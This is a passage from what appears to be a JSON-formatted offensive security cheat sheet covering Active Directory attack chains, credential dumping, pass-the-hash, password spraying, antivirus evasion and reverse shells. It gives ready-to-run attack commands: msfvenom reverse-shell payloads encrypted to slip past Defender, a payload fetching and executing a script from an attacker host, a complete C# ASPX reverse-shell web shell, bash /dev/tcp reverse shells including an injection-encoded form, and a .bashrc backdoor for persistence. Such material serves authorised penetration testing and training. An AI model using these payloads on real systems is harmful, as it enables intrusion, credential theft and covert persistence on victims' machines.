        "content": "**Spray to Shell:** Password spray -> valid creds -> WinRM/SMB shell\n**Kerberoast:** Valid user -> request TGS -> crack hash -> service account access\n**AS-REP Roast:** User list -> find no-preauth users -> crack -> domain access\n**AS-REP Roast Chain:** Enumerate users -> GetNPUsers -> crack hash -> WinRM/SMB shell\n**Kerberoast Chain:** Enumerate SPNs -> extract TGS -> crack service password -> lateral movement or DA\n**Kerbrute + Spray:** Username enum -> password spray -> valid creds -> shell\n**Lateral Movement:** Dump creds -> PtH/PtT -> move to next target -> repeat\n**ACL Abuse to DCSync:** BloodHound finds GenericAll on user with DCSync rights -> reset password -> DCSync\n**Delegation to DA:** Find constrained delegation -> compromise service account -> impersonate Administrator\n**Unconstrained Delegation:** Compromise machine -> coerce DC auth -> capture TGT -> DCSync\n**Constrained Delegation:** Control delegating account -> S4U2Self/Proxy -> impersonate admin -> access target\n**RBCD:** Write access to computer -> create machine account -> configure delegation -> impersonate admin"
      }
    ]
  },
  {
    "category": "Password Cracking",
    "title": "Attack Types",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Different methods for attacking password hashes:\n- **Dictionary/Wordlist Attack**: Uses precompiled list of words and phrases\n- **Brute-Force Attack**: Attempts every possible combination of a character set\n- **Rule Attack**: Generates permutations against a wordlist\n- **Mask Attack**: Targeted brute-force using placeholders (e.g., `?a?a?a?l?d?d`)\n- **Hybrid Attack**: Combines Dictionary and Mask attacks",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Just-In-Time (JIT) Access",
    "title": "Attacking PAM Infrastructure",
    "tags": [
      "Active_Directory",
      "Windows"
    ],
    "steps": [
      {
        "title": "Target PAM Forest",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "PAM forest DC is high-value target. Compromise provides access to all shadow principals.",
            "variant": "danger"
          }
        ]
      },
      {
        "title": "SID History Attack",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If PAM trust allows SID filtering bypass, inject SID history to shadow principal.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Golden Ticket in PAM Forest",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz.exe\nkerberos::golden /user:Administrator /domain:<PAMDomain> /sid:<PAMDomainSID> /krbtgt:<PAMKrbtgt> /sids:<ProductionAdminSID> /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "LDAP Enumeration",
    "title": "Authenticated LDAP Enumeration",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
    "steps": [
      {
        "title": "ldapsearch with Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Flags:\n- `-D`: Bind DN (username)\n- `-w`: Password (use `-W` for interactive prompt)",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Find All Domain Admins",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\" \"(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)\" sAMAccountName"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Users with SPN (Kerberoastable)",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\" \"(&(objectClass=user)(servicePrincipalName=*))\" sAMAccountName servicePrincipalName"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Users with adminCount=1",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\" \"(&(objectClass=user)(adminCount=1))\" sAMAccountName"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "`adminCount=1` indicates users who are/were members of privileged groups.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Find Computers with Unconstrained Delegation",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\" \"(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" dNSHostName"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find Users with \"Do Not Require Kerberos Preauthentication\" (AS-REP Roastable)",
        "codes": [
          {
            "lang": "bash",
            "code": "ldapsearch -x -H ldap://<DomainController> -D \"<Username>@<Domain>\" -w '<Password>' -b \"DC=corp,DC=local\" \"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" sAMAccountName"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Most domains require authentication for LDAP queries.",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Evil-WinRM",
    "title": "Authentication Methods",
    "tags": [],
    "steps": [
      {
        "title": "Password Authentication",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Domain Authentication",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Pass the Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -H <NTHash>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Only the NT hash is needed, not the full LM:NT format.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "SSL/TLS Connection (Port 5986)",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -S"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Use `-S` flag when connecting to port 5986 (HTTPS).",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Certificate-Based Authentication",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -c <Certificate>.pem -k <PrivateKey>.pem -S"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Requires both public certificate (`-c`) and private key (`-k`) files.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Kerberos Authentication",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <Hostname> -r <REALM> -u <Username> -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Must use hostname (not IP) for Kerberos authentication.",
            "variant": "important"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "NetExec",
    "title": "Authentication Methods",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Domain Authentication",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Local Authentication",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --local-auth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Pass-the-Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -H <NTLMHash>"
          },
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Kerberos Authentication",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -d <Domain> --kerberos"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Null Session",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u '' -p ''"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Guest Account",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u 'guest' -p ''"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Privilege Escalation",
    "title": "Automated Enumeration",
    "tags": [
      "Linux",
      "Post_Exploitation",
      "Privilege_Escalation"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n./pspy64\n```"
      }
    ]
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Automated Extraction with Impacket",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "secretsdump.py with VSS",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump -use-vss <Domain>/<Username>:'<Password>'@<DomainController>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Automatically creates shadow copy, extracts NTDS.dit, and dumps hashes.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "secretsdump.py with Specific User",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump -use-vss -just-dc-user <TargetUser> <Domain>/<Username>:'<Password>'@<DomainController>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "secretsdump.py with NTLM Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-secretsdump -use-vss -hashes :<NTLMHash> <Domain>/<Username>@<DomainController>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Automated Extraction with NetExec",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "Dump NTDS.dit with VSS Method",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DomainController> -u <Username> -p '<Password>' --ntds vss"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Dump NTDS.dit with DRSUAPI Method",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <DomainController> -u <Username> -p '<Password>' --ntds drsuapi"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "DRSUAPI is stealthier but requires Domain Admin or equivalent.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Security Headers Scanning",
    "title": "Automated Scanning Tools",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "SecurityHeaders.com (Online)",
        "codes": [
          {
            "lang": "text",
            "code": "https://securityheaders.com/?q=https://example.com"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Provides letter grade (A+ to F) and detailed recommendations.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Mozilla Observatory (Online)",
        "codes": [
          {
            "lang": "text",
            "code": "https://observatory.mozilla.org/analyze/example.com"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Comprehensive security analysis including headers, TLS, and more.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "shcheck - Security Headers Check (CLI)",
        "codes": [
          {
            "lang": "bash",
            "code": "# Install\npip3 install shcheck\n\n# Scan single URL\nshcheck https://example.com\n\n# Scan with custom headers\nshcheck https://example.com -H \"Cookie: session=abc123\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Nikto (Includes Header Checks)",
        "codes": [
          {
            "lang": "bash",
            "code": "nikto -h https://example.com"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Nikto checks for missing security headers as part of its scan.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Nmap HTTP Security Headers Script",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -p 443 --script http-security-headers <TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Custom Python Script",
        "codes": [
          {
            "lang": "python",
            "code": "#!/usr/bin/env python3\nimport requests\n\nurl = \"https://example.com\"\nresponse = requests.get(url)\n\nsecurity_headers = [\n    \"Content-Security-Policy\",\n    \"X-Frame-Options\",\n    \"Strict-Transport-Security\",\n    \"X-Content-Type-Options\",\n    \"X-XSS-Protection\",\n    \"Referrer-Policy\",\n    \"Permissions-Policy\"\n]\n\nprint(f\"Security Headers for {url}:\\n\")\nfor header in security_headers:\n    value = response.headers.get(header, \"MISSING\")\n    print(f\"{header}: {value}\")"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Default Credentials",
    "title": "Automated Testing",
    "tags": [],
    "steps": [
      {
        "title": "CrackMapExec Password Spray",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create comprehensive default list\ncat > defaults.txt << EOF\npassword\npassword1\nPassword1\nPassword@123\nadmin\nadministrator\nwelcome\nWelcome1\nP@ssw0rd\nP@ssword1\nEOF\n\n# Spray against target\ncrackmapexec smb <TargetIP> -u usernames.txt -p defaults.txt --continue-on-success"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Hydra Brute Force",
        "codes": [
          {
            "lang": "bash",
            "code": "# SSH with defaults\nhydra -L users.txt -P defaults.txt ssh://<TargetIP>\n\n# RDP with defaults\nhydra -L users.txt -P defaults.txt rdp://<TargetIP>\n\n# HTTP form with defaults\nhydra -L users.txt -P defaults.txt <TargetIP> http-post-form \"/login:username=^USER^&password=^PASS^:F=incorrect\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Metasploit Auxiliary Modules",
        "codes": [
          {
            "lang": "bash",
            "code": "msfconsole\nuse auxiliary/scanner/ssh/ssh_login\nset RHOSTS <TargetIP>\nset USER_FILE users.txt\nset PASS_FILE defaults.txt\nrun"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "Automated Tools",
    "tags": [],
    "steps": [
      {
        "title": "GitTools",
        "codes": [
          {
            "lang": "bash",
            "code": "# Clone GitTools\ngit clone https://github.com/internetwache/GitTools.git\ncd GitTools\n\n# Dumper\n./Dumper/gitdumper.sh http://<TargetIP>/.git/ /output/dir\n\n# Extractor (extract commits)\n./Extractor/extractor.sh /output/dir /extracted\n\n# Finder (find .git directories)\n./Finder/gitfinder.py -i targets.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "TruffleHog",
        "codes": [
          {
            "lang": "bash",
            "code": "# Install\npip3 install truffleHog\n\n# Scan repository\ntrufflehog git file:///path/to/repo\n\n# Scan remote repository\ntrufflehog git https://github.com/user/repo"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "GitLeaks",
        "codes": [
          {
            "lang": "bash",
            "code": "# Install\nwget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz\ntar -xzf gitleaks_8.18.0_linux_x64.tar.gz\n\n# Scan repository\n./gitleaks detect --source /path/to/repo\n\n# Scan with verbose output\n./gitleaks detect --source /path/to/repo -v"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "AV Evasion Fundamentals",
    "title": "AV Evasion Fundamentals",
    "tags": [
      "Defense_Evasion",
      "Windows"
    ],
    "steps": [
      {
        "title": "Antivirus Detection Methods",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Detection layers to bypass:\n- **Signature-based** - Pattern matching against known malware signatures\n- **Heuristic** - Behavioral patterns and suspicious characteristics\n- **Behavioral** - Runtime monitoring of process actions\n- **Machine Learning** - Statistical models trained on malware samples\n- **Sandboxing** - Execute in isolated environment to observe behavior",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Simulating Target Environment",
        "substeps": [
          {
            "title": "Install Windows Defender",
            "codes": [
              {
                "lang": "powershell",
                "code": "# Check Defender status\nGet-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Windows Defender is default on Windows 10/11. Ensure real-time protection is enabled for testing.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Update Definitions",
            "codes": [
              {
                "lang": "powershell",
                "code": "Update-MpSignature"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Locating Signatures in Files",
        "substeps": [
          {
            "title": "DefenderCheck Tool",
            "codes": [
              {
                "lang": "powershell",
                "code": "DefenderCheck.exe <PayloadFile>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true,
            "notes": [
              {
                "type": "note",
                "content": "Identifies which bytes in file trigger Defender detection.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "ThreatCheck",
            "codes": [
              {
                "lang": "powershell",
                "code": "ThreatCheck.exe -f <PayloadFile>"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          },
          {
            "title": "Manual Signature Finding",
            "codes": [
              {
                "lang": "powershell",
                "code": "# Split file\n$bytes = [System.IO.File]::ReadAllBytes(\"payload.exe\")\n$half = $bytes.Length / 2\n$firstHalf = $bytes[0..($half-1)]\n$secondHalf = $bytes[$half..($bytes.Length-1)]\n[System.IO.File]::WriteAllBytes(\"first.bin\", $firstHalf)\n[System.IO.File]::WriteAllBytes(\"second.bin\", $secondHalf)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Split file in half, test each half, repeat until signature located.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Payload Encoding and Encryption",
        "substeps": [
          {
            "title": "List Available Encoders",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom --list encoders"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Shikata Ga Nai Encoder (x86)",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Polymorphic XOR encoder. Multiple iterations increase uniqueness but are heavily signatured.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "XOR Dynamic Encoder (x64)",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -e x64/xor_dynamic -i 5 -f exe -o payload.exe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "List Available Encryptors",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom --list encrypt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "AES Encryption",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> --encrypt aes256 --encrypt-key <32ByteKey> -f elf -o payload.elf"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "XOR Encryption",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/x64/exec CMD=\"powershell -ep bypass -c IEX(curl <AttackerIP>/script.ps1)\" --encrypt xor --encrypt-key <Key> -f exe -o payload.exe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Generate Raw Shellcode for Custom Loaders",
        "substeps": [
          {
            "title": "Raw Shellcode (Binary)",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f raw -o shellcode.bin"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "C# Format",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/x64/exec CMD=\"calc.exe\" -f csharp"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Python Format",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f python"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "PowerShell Format",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f psh"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "ASPX Reverse Shells (IIS)",
        "substeps": [
          {
            "title": "Test ASPX Execution",
            "codes": [
              {
                "lang": "bash",
                "code": "locate cmdasp.aspx\n# Usually at /usr/share/webshells/aspx/cmdasp.aspx"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Upload `cmdasp.aspx` web shell to verify IIS processes ASPX files before attempting reverse shell."
              }
            ],
            "postNotes": [
              {
                "type": "note",
                "content": "Browse to `http://<Target>/cmdasp.aspx` - if you get a command form, ASPX execution works."
              }
            ]
          },
          {
            "title": "Test Outbound Connectivity",
            "codes": [
              {
                "lang": "powershell",
                "code": "powershell -c \"Test-NetConnection <LHOST> -Port <LPORT>\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "From the web shell, verify the target can reach your listener:"
              }
            ],
            "postNotes": [
              {
                "type": "note",
                "content": "If `TcpTestSucceeded: True`, outbound works and AV is killing the payload."
              }
            ]
          },
          {
            "title": "Custom ASPX Reverse Shell",
            "codes": [
              {
                "lang": "xml",
                "code": "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Runtime.InteropServices\" %>\n<%@ Import Namespace=\"System.Net\" %>\n<%@ Import Namespace=\"System.Net.Sockets\" %>\n<%@ Import Namespace=\"System.IO\" %>\n<script runat=\"server\">\nprotected void Page_Load(object sender, EventArgs e)\n{\n    using(TcpClient c = new TcpClient(\"<LHOST>\", <LPORT>))\n    {\n        using(Stream s = c.GetStream())\n        {\n            StreamReader r = new StreamReader(s);\n            StreamWriter w = new StreamWriter(s);\n            w.AutoFlush = true;\n            System.Diagnostics.Process p = new System.Diagnostics.Process();\n            p.StartInfo.FileName = \"cmd.exe\";\n            p.StartInfo.CreateNoWindow = true;\n            p.StartInfo.UseShellExecute = false;\n            p.StartInfo.RedirectStandardOutput = true;\n            p.StartInfo.RedirectStandardInput = true;\n            p.StartInfo.RedirectStandardError = true;\n            p.OutputDataReceived += (sender2, e2) => { w.WriteLine(e2.Data); };\n            p.ErrorDataReceived += (sender3, e3) => { w.WriteLine(e3.Data); };\n            p.Start();\n            p.BeginOutputReadLine();\n            p.BeginErrorReadLine();\n            while(true)\n            {\n                string cmd = r.ReadLine();\n                if(cmd == null) break;\n                p.StandardInput.WriteLine(cmd);\n            }\n        }\n    }\n}\n</script>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "This C# reverse shell evades Defender signatures better than msfvenom output."
              }
            ]
          },
          {
            "title": "Start Listener",
            "codes": [
              {
                "lang": "bash",
                "code": "rlwrap nc -lvnp <LPORT>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": true
          },
          {
            "title": "Trigger Shell",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Browse to `http://<Target>/shell.aspx` in a browser. The page load triggers the reverse shell."
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "msfvenom ASPX payloads are heavily signatured and will be caught by Defender. Use a custom C# ASPX shell instead.",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "MITRE ATT&CK - Defense Evasion",
        "url": "https://attack.mitre.org/tactics/TA0005/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Understand AV detection to develop effective evasion. Modern AV uses multiple detection layers.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "File Transfer Techniques",
    "title": "Base64 Encoding (Small Files)",
    "tags": [],
    "steps": [
      {
        "title": "Encode on Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "base64 -w 0 nc.exe > nc.b64\ncat nc.b64"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Decode on Windows",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Copy base64 string and decode\n$b64 = \"TVqQAAMAAAAEAAAA//8AALgAAAAA...\"\n[System.IO.File]::WriteAllBytes(\"nc.exe\", [System.Convert]::FromBase64String($b64))"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Decode on Linux",
        "codes": [
          {
            "lang": "bash",
            "code": "echo \"TVqQAAMAAAAEAAAA//8AALgAAAAA...\" | base64 -d > nc\nchmod +x nc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Reverse Shells",
    "title": "Bash Reverse Shells",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Standard Bash TCP",
        "codes": [
          {
            "lang": "bash",
            "code": "bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Bash with sh Wrapper",
        "codes": [
          {
            "lang": "bash",
            "code": "bash -c \"bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1\""
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Bash Alternative Syntax",
        "codes": [
          {
            "lang": "bash",
            "code": "0<&196;exec 196<>/dev/tcp/<AttackerIP>/<Port>; sh <&196 >&196 2>&196"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Bash UDP",
        "codes": [
          {
            "lang": "bash",
            "code": "sh -i >& /dev/udp/<AttackerIP>/<Port> 0>&1"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Listener: `nc -u -lvp <Port>`"
          }
        ]
      },
      {
        "title": "URL Encoded (for injection)",
        "codes": [
          {
            "lang": "text",
            "code": "bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<AttackerIP>%2F<Port>%200%3E%261%22"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Persistence",
    "title": "Bashrc and Profile Backdoors",
    "tags": [
      "Linux",
      "Persistence"
    ],
    "steps": [
      {
        "title": ".bashrc Backdoor",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> ~/.bashrc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": ".profile Backdoor",
        "codes": [
          {
            "lang": "bash",
